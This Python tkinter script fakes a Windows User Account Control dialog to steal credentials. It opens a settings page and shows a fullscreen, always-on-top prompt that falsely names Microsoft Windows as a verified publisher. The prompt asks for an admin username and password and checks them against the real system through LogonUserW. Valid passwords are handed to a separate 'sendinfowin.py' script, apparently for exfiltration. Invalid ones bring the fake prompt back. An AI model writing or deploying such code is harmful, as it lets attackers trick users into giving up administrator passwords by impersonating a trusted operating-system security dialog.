from tkinter import *
from PIL import Image, ImageTk
from ctypes import windll
import subprocess
import sys
import ctypes
from ctypes import wintypes
import os
os.chdir(os.path.dirname(os.path.abspath(__file__)))
windll.shcore.SetProcessDpiAwareness(1)
os.system ("start ms-settings:storagesense")

valid = True

class CloseableLabel(Label):
    def __init__(self, master=None, **kwargs):
        super().__init__(master, **kwargs)
        self.bind("<Button-1>", self.close_window)

    def close_window(self, event):
        self.master.destroy()

def on_entry_click1(event):
    if entry1.get() == '  Username':
       entry1.delete(0, "end")
       entry1.insert(0, '')
       entry1.config(fg = 'black')
def on_focusout1(event):
    if entry1.get() == '  ':
        entry1.insert(END, 'Username')
        entry1.config(fg = 'grey')
def check1(*args):
    if len (entry1.get ()) < len("  "):
        entry1.delete(0, "end")
        entry1.insert(0, '  ')
        entry1.bind('<BackSpace>', lambda _:'break')
        entry1.bind('<Delete>', lambda _:'break')
        entry1.bind('<Shift-.>', lambda _:'break')
        if entry1.select_present():
            entry1.select_clear()
    else:
        entry1.unbind('<BackSpace>')
        entry1.unbind('<Delete>')
        entry1.unbind('<Shift-.>')

def on_entry_click2(event):
    if entry2.get() == '  Password':
       entry2.delete(0, "end")
       entry2.insert(0, '')
       entry2.config(fg = 'black')
def on_focusout2(event):
    if entry2.get() == '  ':
        entry2.insert(END, 'Password')
        entry2.config(fg = 'grey')
def check2(*args):
    if len (entry2.get ()) < len("  "):
        entry2.delete(0, "end")
        entry2.insert(0, '  ')
        entry2.bind('<BackSpace>', lambda _:'break')
        entry2.bind('<Delete>', lambda _:'break')
        entry2.bind('<Shift-.>', lambda _:'break')
        if entry2.select_present():
            entry2.select_clear()
    else:
        entry2.unbind('<BackSpace>')
        entry2.unbind('<Delete>')
        entry2.unbind('<Shift-.>')

def create_double_box(button1_text, button2_text, x1, x2, y, w, h):
    button_1 = Label(bottom_frame, text=button1_text, fg='black', bg="#b8b8b8", width=w, height=h, font=('Segoe UI', 14), pady=10)
    button_1.pack_propagate(False)
    button_1.config(highlightbackground="white", highlightthickness=0)
    button_1.place(relx=x1, rely=y)
    button_1.bind("<Enter>", lambda event: button_1.config(bg='#939393', fg='black'))
    button_1.bind("<Leave>", lambda event: button_1.config(bg="#b8b8b8", fg='black'))
    button_1.bind("<Button-1>", lambda e: on_button1_click(button1_text))

    button_2 = Label(bottom_frame, text=button2_text, fg='black', bg="#b8b8b8", width=w, height=h, font=('Segoe UI', 14), pady=10)
    button_2.pack_propagate(False)
    button_2.config(highlightbackground="white", highlightthickness=0)
    button_2.place(relx=x2, rely=y)
    button_2.bind("<Enter>", lambda event: button_2.config(bg='#939393', fg='black'))
    button_2.bind("<Leave>", lambda event: button_2.config(bg="#b8b8b8", fg='black'))
    button_2.bind("<Button-1>", lambda f: root.destroy ())

def on_button1_click(button_text):
    user = str (entry1.get ()).replace ('  ', '')
    pword = str (entry2.get ()).replace ('  ', '')

    def is_valid_password(username, password):
        # Load the advapi32.dll and kernel32.dll libraries
        advapi32 = ctypes.WinDLL('advapi32')
        kernel32 = ctypes.WinDLL('kernel32')

        # Define the LogonUser and CloseHandle functions
        LogonUser = advapi32.LogonUserW
        LogonUser.argtypes = [
            ctypes.c_wchar_p,  # lpszUsername
            ctypes.c_wchar_p,  # lpszDomain
            ctypes.c_wchar_p,  # lpszPassword
            ctypes.c_uint,     # dwLogonType
            ctypes.c_uint,     # dwLogonProvider
            ctypes.POINTER(ctypes.c_void_p)  # phToken
        ]
        LogonUser.restype = ctypes.c_int

        CloseHandle = kernel32.CloseHandle
        CloseHandle.argtypes = [ctypes.c_void_p]
        CloseHandle.restype = ctypes.wintypes.BOOL

        # Constants for LogonUser
        LOGON32_LOGON_NETWORK = 3
        LOGON32_PROVIDER_DEFAULT = 0

        # Attempt to log in
        token = ctypes.c_void_p()
        result = LogonUser(
            ctypes.c_wchar_p(username),
            None,
            ctypes.c_wchar_p(password),
            LOGON32_LOGON_NETWORK,
            LOGON32_PROVIDER_DEFAULT,
            ctypes.byref(token)
        )

        # Check the result
        if result:
            #print ("Password is valid.")
            CloseHandle(token)
            return True
        else:
            #print("Password is invalid.")
            return False

    global valid
    valid = is_valid_password (user, pword)
    if valid:
        other_script_path = r'sendinfowin.py'
        subprocess.call ([sys.executable, other_script_path, pword])
        #import sendinfowin
        root.destroy ()
        root.master.quit ()
    else:
        root.destroy ()
        import time
        time.sleep (1)
        show ()


def on_button2_click(button_text):
    #print(f"Button 2 clicked! Text: {button_text}")
    pass

def create_uac_box(width_percent, height_percent1, height_percent2):
    def make_label(parent, path, x, y, relx, rely):
        img = ImageTk.PhotoImage(Image.open(path).resize((x, y)))
        label = Label(parent, image=img, bg='#e6e6e6')
        label.image = img
        label.place(relx=relx, rely=rely, anchor='w')

    # Create the main window
    global root, bottom_frame, top_frame
    root = Toplevel()
    #root = Tk ()

    global screen_width, screen_height
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    root.overrideredirect(True)
    root.geometry(f"{screen_width}x{screen_height}")
    root.wm_attributes("-transparentcolor", "bisque")
    root.wm_attributes("-topmost", True)

    columns = []
    for i in range(5):
        for j in range (20):
            frame = Frame(root, borderwidth=0, relief="raised", bg='bisque')
            frame.place(relx=i/5, rely=j/20, relwidth=1/5, relheight=1/20)
            columns.append(frame)
    #for i in range(5):
    #    frame = Frame(root, borderwidth=0, relief="raised", bg='bisque')
    #    columns.append(frame)

    #for column, f in enumerate(columns):
    #    f.grid(row=0, column=column, sticky="nsew")
    #    root.grid_columnconfigure(column, weight=1, uniform="column")

    box_width = int(screen_width * width_percent)
    box_height1 = int(screen_height * height_percent1)
    box_height2 = int (screen_height * height_percent2) / 1.2

    ys = [0.16, 0.12, 0.27, 0.37, 0.44, 0.545, 0.665, 0.81, 0.9]
    ys2 = 0.09

    if not valid:
        box_height2 = int (screen_height * height_percent2) / 1.05
        ys = [0.128, 0.11, 0.24, 0.32, 0.385, 0.465, 0.565, 0.8, 0.9]
        ys2 = 0.08

    # Create a top frame with dimensions 915x190 and color #76b9ed
    top_frame = LabelFrame(root, width=box_width/1.5, height=box_height1, bg='#76b9ed')
    top_frame.grid(row=6, column=2, sticky="nsew")

    # Create a label in the top frame with the specified text and style
    label1_text = "User Account Control"
    label1_top = Label(top_frame, text=label1_text, font=('Oslo', 12), foreground="black", bg='#76b9ed', wraplength=box_width/1.5, justify=LEFT)
    label1_top.place(relx=0.04, rely=0.17, anchor="w")

    label2_text = "Do you want to allow this app to make"
    label2_top = Label(top_frame, text=label2_text, font=('Lisboa Sans', 20), foreground="black", bg='#76b9ed', wraplength=box_width/1.3, justify=LEFT)
    label2_top.place(relx=0.04, rely=0.5, anchor="w")

    label3_text = "changes to your device?"
    label3_top = Label(top_frame, text=label3_text, font=('Lisboa Sans', 20), foreground="black", bg='#76b9ed', wraplength=box_width/1.3, justify=LEFT)
    label3_top.place(relx=0.04, rely=0.75, anchor="w")

    # Create the custom label with a cross
    close_label = CloseableLabel(root, text="✕", font=("Arial", 14), fg="black", bg='#76b9ed')
    close_label.place(relx=0.70, rely=ys[0], anchor="ne")

    # Create a bottom frame with dimensions 915x770 and color #e6e6e6
    bottom_frame = LabelFrame(root, width=box_width/1.5, height=box_height2, bg='#e6e6e6')
    bottom_frame.grid(row=7, column=2, sticky="nsew")

    # Adjust column weights to make the middle column take up more space
    for i in range(5):
        root.grid_columnconfigure(i, weight=1)
    
    # Adjust row weights to make the middle row take up more space
    for i in range(15):
        root.grid_rowconfigure(i, weight=1)

    label_btext1 = "Windows Settings"
    label_bottom1 = Label(bottom_frame, text=label_btext1, font=('Quebec Serial', 18), foreground="black", bg='#e6e6e6')
    label_bottom1.place(relx=0.18, rely=ys[1], anchor="w")
    make_label(bottom_frame, "settings.png", 100, 95, 0.04, ys[1])
    label_btext2 = "Verified publisher: Microsoft Windows"
    label_bottom2 = Label(bottom_frame, text=label_btext2, font=('Quebec Serial', 14), foreground="black", bg='#e6e6e6')
    label_bottom2.place(relx=0.04, rely=ys[2], anchor="w")
    label_bottom3 = Label(bottom_frame, text="Show more details", bg='#e6e6e6', fg='#2e6d8b', font=('Quebec Serial', 13), cursor='hand2')
    label_bottom3.place(relx=0.04, rely=ys[3], anchor='w')
    label_btext3 = "To continue, enter an admin user name and password."
    label_bottom3 = Label(bottom_frame, text=label_btext3, font=('Quebec Serial', 14), foreground="black", bg='#e6e6e6')
    label_bottom3.place(relx=0.04, rely=ys[4], anchor="w")
    
    global entry1
    var = StringVar()
    var.trace('w', check1)
    entry1 = Entry (bottom_frame, textvariable=var)
    entry1.insert(END, '  Username')
    entry1.bind('<FocusIn>', on_entry_click1)
    entry1.bind('<FocusOut>', on_focusout1)
    entry1.bind('<ButtonRelease>', check1)
    entry1.bind('<Key>', check1)
    entry1.config(fg = 'grey', font=('Quebec Serial', 13), highlightbackground="grey", highlightthickness=2, relief=FLAT)
    entry1.place (relx=0.045, rely=ys[5], relwidth=0.6, relheight=ys2, anchor='w')
    entry1.focus ()

    global entry2
    var2 = StringVar()
    var2.trace('w', check2)
    entry2 = Entry (bottom_frame, textvariable=var2)
    entry2.insert(END, '  Password')
    entry2.bind('<FocusIn>', on_entry_click2)
    entry2.bind('<FocusOut>', on_focusout2)
    entry2.bind('<ButtonRelease>', check2)
    entry2.bind('<Key>', check2)
    entry2.config(fg = 'grey', font=('Quebec Serial', 13), highlightbackground="grey", highlightthickness=2, relief=FLAT)
    entry2.place (relx=0.045, rely=ys[6], relwidth=0.6, relheight=ys2, anchor='w')
    
    label_bottom4 = Label(bottom_frame, text="More choices", bg='#e6e6e6', fg='#2e6d8b', font=('Quebec Serial', 14), cursor='hand2')
    label_bottom4.place(relx=0.04, rely=ys[7], anchor='w')

    create_double_box ('Yes', 'No', 0.04, 0.505, ys[8], 26, 1)

    if not valid:
        new_label = Label(bottom_frame, text="The user name or password is incorrect.", bg='#e6e6e6', fg='red', font=('Quebec Serial', 13))
        new_label.place(relx=0.04, rely=0.7, anchor='w')

    # Start the Tkinter event loop
    root.mainloop()

def show ():
    create_uac_box (0.4, 0.14, 0.6)

